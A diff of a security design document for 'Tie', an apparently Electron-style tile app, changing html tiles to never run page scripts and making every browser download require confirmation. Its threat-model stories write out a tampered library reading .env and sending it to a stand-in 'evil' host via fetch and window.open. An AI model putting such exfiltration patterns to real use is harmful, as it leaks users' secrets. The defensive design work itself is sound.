@@ -147,7 +147,7 @@
   <ul>
     <li><strong>A terminal.</strong> The UI asks main <code>pty:spawn</code>. Main runs the configured shell. Output streams back as bytes; xterm draws them. Only OSC 8 hyperlinks are links (plain URLs aren't clickable); even those do nothing until you cmd-click.</li>
     <li><strong>A markdown file.</strong> The UI asks main to check the file (exists, regular, size cap, kind by extension) and to open a token for its folder. The UI makes an iframe pointing at <code>tie-content://token/_tie/markdown.html</code>. Main serves Tie's viewer there with a fresh per-response nonce in its CSP. The viewer answers a handshake; the UI sends it the file's text over a MessagePort. The viewer renders, sanitizes, and only ever sends typed requests back.</li>
-    <li><strong>An html file.</strong> Same token mechanism, but the frame loads the file itself, with Tie's bootstrap script injected first. The page's own scripts run only if the tile's pill says "Scripts: on"; otherwise the CSP lets only the bootstrap run and the page is static.</li>
+    <li><strong>An html file.</strong> Same token mechanism, but the frame loads the file itself, with Tie's bootstrap script injected first. The CSP lets only the bootstrap run: the page's own scripts never do, and a red "Scripts blocked" tag in the title bar says when a page had some. Html tiles are static documents; a dynamic page belongs in a local server and a browser tile.</li>
     <li><strong>A web site.</strong> The UI creates a webview with <code>src</code>. Main's attach guard throws away every attribute but <code>src</code>, forces the browser partition, sandbox, no preload. From then on the site is a browser tab with extra rules.</li>
   </ul>
 
@@ -170,9 +170,8 @@
       <tr><td><strong>terminal</strong> <span class="tag t">trusted</span></td><td>xterm (Tie's) in the UI; your programs in the pty</td><td>Program output as bytes; your keystrokes</td><td>Everything a program of yours can do; it is you</td><td>Anything, as you. OSC 8 links: hover shows target, cmd-click + confirm; plain URLs aren't links</td></tr>
       <tr><td><strong>markdown</strong> <span class="tag u">untrusted file</span></td><td>Tie's viewer; the file is data</td><td>The file's text; images from its folder (as pixels only)</td><td><code>followLink</code>, <code>hover</code>, <code>pong</code></td><td>Open any local file it names in a tile beside it (shown to you, not to it); open a URL after confirm</td></tr>
       <tr><td><strong>text / hex / image</strong> <span class="tag u">untrusted file</span></td><td>Tie's viewer; the file is data</td><td>The file</td><td><code>pong</code> (no links)</td><td>Nothing</td></tr>
-      <tr><td><strong>html, scripts off</strong> <span class="tag u">untrusted file</span></td><td>Tie's bootstrap only; the page is markup</td><td>Its folder, recursively (stylesheets, images)</td><td><code>followLink</code>, <code>hover</code>, <code>pong</code></td><td>Navigate within its folder; open a file beside; URL after confirm</td></tr>
-      <tr><td><strong>html, scripts on</strong> <span class="tag u">untrusted code</span></td><td>The page's scripts, isolated</td><td>Its folder, recursively (fetch works); its own in-memory storage</td><td>Same verbs, any time while focused</td><td>Same as above; it can <em>ask</em> any time, you still confirm the web</td></tr>
-      <tr><td><strong>browser</strong> <span class="tag u">untrusted site</span></td><td>The site, like a browser tab</td><td>The internet; its own cookies</td><td>Nothing (events only: title, URL, hovered link, loading, crash)</td><td>Popup to system browser within 1 s of your input; download within 10 s of your input</td></tr>
+      <tr><td><strong>html</strong> <span class="tag u">untrusted file</span></td><td>Tie's bootstrap only; the page is markup (its scripts never run)</td><td>Its folder, recursively, by markup only (stylesheets, images, fonts)</td><td><code>followLink</code>, <code>hover</code>, <code>blocked</code>, <code>pong</code></td><td>Navigate within its folder; open a file beside; URL after confirm</td></tr>
+      <tr><td><strong>browser</strong> <span class="tag u">untrusted site</span></td><td>The site, like a browser tab</td><td>The internet; its own cookies</td><td>Nothing (events only: title, URL, hovered link, loading, crash)</td><td>Popup to system browser within 1 s of your input; download after you confirm it</td></tr>
     </tbody>
   </table></div>
   <p>Notice what is absent from the last column everywhere except the terminal: the UI, the ptys, other tiles, your files beyond the one folder, the network. Those are the doors. Part 5 lists them.</p>
@@ -183,7 +182,7 @@
   <h3>Principles</h3>
   <ol>
     <li><strong>Viewing is safe.</strong> Opening a file to look at it must never be a decision. So viewers are Tie's code, the file is data, and html opens static.</li>
-    <li><strong>Running is a choice.</strong> Scripts run only when a human turned them on (the pill, or the <code>htmlScripts</code> setting) and only inside the glass room.</li>
+    <li><strong>Running is a choice.</strong> Nothing you open in a tile runs code of its own: html is static, viewers are Tie's. Running happens in terminals and browser tiles, where you chose it.</li>
     <li><strong>Content never reaches the UI.</strong> No foreign script in the UI realm, no navigation of the UI window, no message listener on the window. The bridge to main exists only there.</li>
     <li><strong>Main decides.</strong> The UI names paths and URLs; main checks every one again: absolute, exists, inside the root, real path, size cap, kind, scheme. So a shell bug can't widen file or link access. A <em>compromised</em> shell is still game over: it can spawn ptys. That is why nothing foreign may ever run there.</li>
     <li><strong>Exits are guarded, not features.</strong> A visitor can wave: typed requests only, validated for shape, needing focus for anything that acts, confirmed by you before a link leaves the house (browser-tile popups are the exception: recent input, no dialog).</li>
@@ -198,7 +197,7 @@
     <svg viewBox="0 0 880 380" role="img" aria-label="Concentric layers around a content tile: process and site isolation, origin and sandbox attribute, CSP and no-network session, navigation lock, typed requests over one port, gesture rule and confirms, main re-validation.">
       <g fill="none" stroke="currentColor" stroke-width="1.3" font-family="-apple-system, Helvetica Neue, sans-serif" font-size="13">
         <rect x="20" y="20" width="840" height="340" rx="10"/><text x="34" y="44" fill="currentColor" stroke="none" font-weight="700">7 · main re-validates: path inside root, real path, size, kind, http(s) only</text>
-        <rect x="60" y="62" width="760" height="278" rx="10"/><text x="74" y="86" fill="currentColor" stroke="none" font-weight="700">6 · you: confirm for the web, focus for anything that acts, the scripts pill</text>
+        <rect x="60" y="62" width="760" height="278" rx="10"/><text x="74" y="86" fill="currentColor" stroke="none" font-weight="700">6 · you: confirm for the web and for downloads, focus for anything that acts</text>
         <rect x="100" y="104" width="680" height="216" rx="10"/><text x="114" y="128" fill="currentColor" stroke="none" font-weight="700">5 · one MessagePort, typed verbs, strict shape, flood cap</text>
         <rect x="140" y="146" width="600" height="154" rx="10"/><text x="154" y="170" fill="currentColor" stroke="none" font-weight="700">4 · navigation lock: this token's viewer, or pages of this root, nothing else</text>
         <rect x="180" y="188" width="520" height="92" rx="10"/><text x="194" y="212" fill="currentColor" stroke="none" font-weight="700">3 · CSP (nonce or 'self' only) + session with no network at all</text>
@@ -210,10 +209,10 @@
   <ol>
     <li><strong>Process.</strong> Site isolation: a different origin means a different renderer process. A renderer exploit in a content frame lands in a process with no Node, no bridge, and nothing but that frame.</li>
     <li><strong>Origin and sandbox.</strong> Viewer frames: <code>sandbox="allow-scripts"</code>, opaque origin: no storage, no fetch, no cookies, no same-origin anything. Html frames add <code>allow-same-origin</code> so the page's own modules and fetch of its folder work, on its token origin, which is still foreign to the UI.</li>
-    <li><strong>CSP and no network.</strong> Viewer pages: scripts only by a nonce minted per response; images only from the own token. Html pages: only <code>'self'</code> (the token) plus <code>data:</code>/<code>blob:</code> for styles, images, fonts, media; connections to <code>'self'</code> only; scripts <code>'self'</code> plus inline and eval when on, by nonce (the bootstrap only) when off. Under all of it, the UI session's proxy points every connection at a closed port and WebRTC may not use UDP: even a CSP bug reaches no network.</li>
+    <li><strong>CSP and no network.</strong> Viewer pages: scripts only by a nonce minted per response; images only from the own token. Html pages: only <code>'self'</code> (the token) plus <code>data:</code>/<code>blob:</code> for styles, images, fonts, media; connections to <code>'self'</code> only; scripts by nonce only (the bootstrap), no workers. Under all of it, the UI session's proxy points every connection at a closed port and WebRTC may not use UDP: even a CSP bug reaches no network.</li>
     <li><strong>Navigation lock.</strong> Main sees every navigation of every frame. A frame may load only its token's exact viewer URL (viewers) or <code>.html</code> files of its own root (html). Each token binds to the first frame that loads it. The UI window itself may only reload itself.</li>
     <li><strong>One port, typed verbs.</strong> The UI hands each frame one MessagePort after load. Requests must be plain objects with a known verb and exactly its keys. Over a thousand a second are dropped unread.</li>
-    <li><strong>You.</strong> Verbs that act (<code>followLink</code>, <code>openLink</code>) need the frame to be focused, and frames can't focus themselves (Blink refuses focus calls without a user gesture under the permissions policy Tie sets). Links from file tiles and terminals show you the full URL first (setting <code>confirmExternal</code>, on by default), with Open disabled for 600 ms. Browser-tile popups skip the dialog: they go to the system browser only within 1 s of your input in that tile. Scripts in html pages run only after you flip the pill (or set <code>htmlScripts</code>).</li>
+    <li><strong>You.</strong> Verbs that act (<code>followLink</code>, <code>openLink</code>) need the frame to be focused, and frames can't focus themselves (Blink refuses focus calls without a user gesture under the permissions policy Tie sets). Links from file tiles and terminals show you the full URL first (setting <code>confirmExternal</code>, on by default), with Open disabled for 600 ms. Browser-tile popups skip the dialog: they go to the system browser only within 1 s of your input in that tile. Every download asks you first.</li>
     <li><strong>Main again.</strong> Whatever the UI asks for after all that, main checks as if the UI were lying.</li>
   </ol>
 
@@ -236,9 +235,8 @@
     <tbody>
       <tr><td><strong>markdown</strong></td><td class="c locked">●</td><td class="c guarded">● images under its folder, as pixels</td><td class="c locked">●</td><td class="c locked">●</td><td class="c guarded">● only when you click in</td><td class="c guarded">● click + confirm</td><td class="c locked">●</td><td class="c locked">●</td></tr>
       <tr><td><strong>text / image / hex</strong></td><td class="c locked">●</td><td class="c locked">●</td><td class="c locked">●</td><td class="c locked">●</td><td class="c guarded">● only when you click in</td><td class="c locked">● no links</td><td class="c locked">●</td><td class="c locked">●</td></tr>
-      <tr><td><strong>html, scripts off</strong></td><td class="c locked">●</td><td class="c guarded">● its folder, as markup</td><td class="c locked">●</td><td class="c locked">●</td><td class="c guarded">● only when you click in</td><td class="c guarded">● click + confirm</td><td class="c locked">●</td><td class="c locked">●</td></tr>
-      <tr><td><strong>html, scripts on</strong></td><td class="c locked">●</td><td class="c guarded">● its folder, readable</td><td class="c locked">●</td><td class="c locked">●</td><td class="c guarded">● while focused, then a few s</td><td class="c guarded">● confirm, scripts may ask</td><td class="c locked">●</td><td class="c locked">●</td></tr>
-      <tr><td><strong>browser</strong></td><td class="c open">●</td><td class="c locked">●</td><td class="c locked">●</td><td class="c locked">●</td><td class="c guarded">● only when you click in</td><td class="c guarded">● popup ≤ 1 s after input</td><td class="c guarded">● ~/Downloads ≤ 10 s after input</td><td class="c locked">●</td></tr>
+      <tr><td><strong>html</strong></td><td class="c locked">●</td><td class="c guarded">● its folder, as markup</td><td class="c locked">●</td><td class="c locked">●</td><td class="c guarded">● only when you click in</td><td class="c guarded">● click + confirm</td><td class="c locked">●</td><td class="c locked">●</td></tr>
+      <tr><td><strong>browser</strong></td><td class="c open">●</td><td class="c locked">●</td><td class="c locked">●</td><td class="c locked">●</td><td class="c guarded">● only when you click in</td><td class="c guarded">● popup ≤ 1 s after input</td><td class="c guarded">● ~/Downloads, after you say Save</td><td class="c locked">●</td></tr>
       <tr><td><strong>terminal (your programs)</strong></td><td class="c open">●</td><td class="c open">●</td><td class="c open">● via <code>tie</code></td><td class="c open">● via <code>tie</code></td><td class="c open">●</td><td class="c guarded">● cmd-click + confirm</td><td class="c open">●</td><td class="c open">●</td></tr>
     </tbody>
   </table></div>
@@ -264,12 +262,12 @@
     <thead><tr><th>Goal</th><th>Needs</th><th>Stopped by</th><th>Residual</th></tr></thead>
     <tbody>
       <tr><td>Run code as you</td><td>Script in the UI realm, a pty write, or the socket</td><td>UI CSP, no foreign navigation, IPC sender check, no window listener, viewers sanitize, socket 0600</td><td>A Chromium sandbox escape; another process of yours</td></tr>
-      <tr><td>Read your files</td><td>A path main will serve</td><td>Token = one root; traversal, symlinks out, other tokens refused; viewers can't fetch at all</td><td>Html with scripts on reads its own folder; keep html roots narrow</td></tr>
+      <tr><td>Read your files</td><td>A path main will serve</td><td>Token = one root; traversal, symlinks out, other tokens refused; viewers can't fetch at all</td><td>None from content: html has no scripts; markup can only display files under its folder</td></tr>
       <tr><td>Send data out</td><td>A network path or a URL you open</td><td>Dead proxy + CSP; confirm with full URL and long-link warning</td><td>You clicking Open on a URL that carries data</td></tr>
       <tr><td>Type for you</td><td>Keyboard focus</td><td>Frames can't focus themselves; shortcuts matched in main</td><td>A few seconds of script focus after your own click in a page</td></tr>
       <tr><td>Make you run something</td><td>Pasted or dropped text reaching a terminal raw</td><td>Paste guard (control characters, would-run newlines), quoted drop paths</td><td>Guards can be turned off in settings</td></tr>
       <tr><td>Deceive</td><td>Looking like something trusted</td><td>Files can't name their tile; kind glyph is Tie's; dialogs are the UI's, outside the tile</td><td>Browser tiles are titled by the site; titles set by your own processes; a page imitating UI inside its own tile</td></tr>
-      <tr><td>Plant files</td><td>A download</td><td>Content frames: refused outright. Guests: only within 10 s of your input, sanitized name, never opened</td><td>Several files within those 10 s</td></tr>
+      <tr><td>Plant files</td><td>A download</td><td>Content frames: refused outright. Guests: a dialog for every download (name, size, site), sanitized unique name, never opened</td><td>You, pressing Save</td></tr>
       <tr><td>Freeze Tie</td><td>Main's memory or the UI thread</td><td>Streaming reads, size caps, watchdog kills hung frames, message flood cap</td><td>A guest hogging CPU until Chromium reports it</td></tr>
     </tbody>
   </table></div>
@@ -283,13 +281,13 @@
     <h3>The poisoned report</h3>
     <ol>
       <li>An agent writes <code>report.html</code> in your repo root and runs <code>tie open report.html</code>. The chart library it bundled was tampered upstream.</li>
-      <li>The tile opens. <span class="stop">Scripts are off:</span> the CSP lets only Tie's bootstrap run. The library is inert markup. End of story unless you flip the pill.</li>
-      <li>Say you flip it. The script runs in its own process and origin. It fetches <code>.env</code>: <span class="leak">allowed</span>, same root.</li>
+      <li>The tile opens. <span class="stop">Html is static:</span> the CSP lets only Tie's bootstrap run. The library is inert markup; the tile shows "Scripts blocked". End of story.</li>
+      <li>What follows is the counterfactual: what the layers would do if a renderer bug ever gave that page script in its own process. It fetches <code>.env</code>: <span class="leak">allowed</span>, same root.</li>
       <li>It tries <code>fetch('https://evil/…')</code>. <span class="stop">CSP refuses; the session's proxy would refuse anyway.</span> WebRTC: <span class="stop">no UDP.</span></li>
       <li>It calls <code>window.open('https://evil/?d=…')</code>. The bootstrap turns it into a request. <span class="stop">Not focused:</span> dropped, and never replayed. You click in the page to read it; the script tries again. Now focused: a dialog appears with the full URL, the site address in bold, a warning that 1,900 characters ride on it. Open is disabled for 600 ms. <span class="stop">You cancel.</span></li>
       <li>It tries <code>window.focus()</code> later to get another chance. <span class="stop">Blink refuses</span> without a fresh gesture.</li>
     </ol>
-    <p>What would have to fail for the data to leave: you, pressing Open on a link that announces itself.</p>
+    <p>Today the story ends at step 2. In the counterfactual, what would have to fail for the data to leave: you, pressing Open on a link that announces itself.</p>
   </div>
 
   <div class="story">
@@ -306,8 +304,8 @@
     <h3>The drive-by</h3>
     <ol>
       <li>A site in a browser tile starts a download of <code>invoice.pdf.command</code> on load.</li>
-      <li><span class="stop">No input reached that guest in the last 10 s:</span> blocked, logged.</li>
-      <li>You click something on the page; it tries again. Saved, under a sanitized unique name, in <code>~/Downloads</code>. <span class="stop">Never opened, never executed.</span></li>
+      <li><span class="stop">Main refuses it and the UI asks:</span> "Save file?", the sanitized name, the size, the site. Save is disabled for 600 ms. Nothing is on disk yet.</li>
+      <li>You press Save. Main allows that URL once; the guest downloads it again; it lands under a unique name in <code>~/Downloads</code>. <span class="stop">Never opened, never executed.</span> Cancel: nothing happens, and the site can only ask again.</li>
       <li>It calls <code>window.open</code> for an ad. Within 1 s of your click: <span class="leak">goes to your system browser</span> (a browser would open a tab; Tie never opens windows). Later: blocked.</li>
       <li>It asks for Bluetooth, the camera, your location, a client certificate. <span class="stop">All denied</span>, no prompt.</li>
     </ol>
